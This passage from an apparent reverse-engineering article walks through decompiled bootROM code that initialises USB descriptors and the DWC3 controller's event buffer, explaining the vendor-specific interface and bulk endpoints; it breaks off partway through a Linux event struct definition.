  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bDeviceClass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bDeviceSubClass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bDeviceProtocol&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bMaxPacketSize0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;DAT_02021544&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;idVendorL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xe8&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;idVendorH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// VENDOR ID 0x04E8&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;idProductL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x34&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;idProductH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x12&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;//PRODUCT ID 0x1234&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bcdDeviceL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bcdDeviceH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;iManufacturer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;iProduct&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;iSerialNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bNumConfigurations&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;usb_init_descriptors&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;USB_DESCRIPTORS&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;byte&lt;/span&gt; &lt;span class="n"&gt;bVar1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;byte&lt;/span&gt; &lt;span class="n"&gt;bVar2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;undefined4&lt;/span&gt; &lt;span class="n"&gt;uVar3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;uVar3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DAT_02021548&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bDescriptorType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DT_CONFIG&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;wTotalLengthL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;wTotalLengthH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bNumInterfaces&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bConfigurationValue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;iConfiguration&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bmAttributes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescConfig&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;maxPower&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xfa&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bDescriptorType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DT_INTERFACE&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bInterfaceNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bAlternateSetting&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bNumEndpoints&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bInterfaceClass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_CLASS_VENDOR_SPEC&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bInterfaceSubClass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bInterfaceProtocol&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescInterface&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;iInterface&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bDescriptorType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DT_ENDPOINT&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bEndpointAddress&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x81&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DIR_IN | 1 : endpoint 1, direction IN&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bmAttributes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_ENDPOINT_XFER_BULK&lt;/span&gt;
  &lt;span class="n"&gt;bVar1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;uVar3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;wMaxPacketSizeL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bVar1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;bVar2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;)((&lt;/span&gt;&lt;span class="n"&gt;uint&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;uVar3&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;wMaxPacketSizeH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bVar2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bInterval&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bDescriptorType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DT_ENDPOINT&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bEndpointAddress&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DIR_OUT | 2 : endpoint 2, direction OUT&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bmAttributes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_ENDPOINT_XFER_BULK&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;wMaxPacketSizeL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bVar1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;wMaxPacketSizeH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bVar2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;oDescEp1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;bInterval&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Among the important details in these descriptors, we can learn that this code implements :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;1 device&lt;/strong&gt; : vendor ID = 0x04E8, product ID = 0x1234.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;1 interface&lt;/strong&gt; of vendor-specific class, which means protocol is likely proprietary.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2 bulk endpoints&lt;/strong&gt; : endpoint 1 for BULK IN transfers, endpoint 2 for BULK OUT transfers.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Event buffer setup&lt;/h2&gt;
&lt;p&gt;During USB initialization, USB driver allocates a buffer called &lt;em&gt;event buffer&lt;/em&gt; and informs USB controller by writing its address and size into registers &lt;strong&gt;DWC3_GEVNTADRLO&lt;/strong&gt;, &lt;strong&gt;DWC3_GEVNTADRHI&lt;/strong&gt;, &lt;strong&gt;DWC3_GEVNTSIZ&lt;/strong&gt;. Once setup, USB controller can write events intended for USB driver into this shared buffer.&lt;/p&gt;
&lt;p&gt;In Linux kernel, these registers are accessed by a single function &lt;em&gt;dwc3_event_buffers_setup&lt;/em&gt;, called once during USB driver initialization. In bootROM code, event buffer is setup in the same way :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;usb_setup_event_buffer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt; &lt;span class="n"&gt;bufferHigh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt; &lt;span class="n"&gt;bufferLow&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;ushort&lt;/span&gt; &lt;span class="n"&gt;bufferSize&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="n"&gt;local_14&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="n"&gt;uVar1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;cWrite_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_GEVNTADRHI&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;bufferHigh&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;cWrite_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_GEVNTADRLO&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;bufferLow&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;uVar1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cRead_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_GEVNTSIZ&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;local_14&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;uVar1&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xffff0000&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uint&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;bufferSize&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;cWrite_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_GEVNTSIZ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;local_14&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Events written to this buffer are 32-bit values with different structures depending on their type : either device or endpoint event. These structures, defined in the Linux kernel, can be imported into Ghidra to facilitate the reversing process.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dwc3_event_depevt&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;// Device Endpoint Events&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;one_bit&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// not used&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;endpoint_number&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// number of the endpoint&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;endpoint_event&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// event type&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;reserved11_10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;u32&lt;/span&gt; &lt;span class="nl"&gt;status&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// Indicates the status of the event&lt;/span&gt;
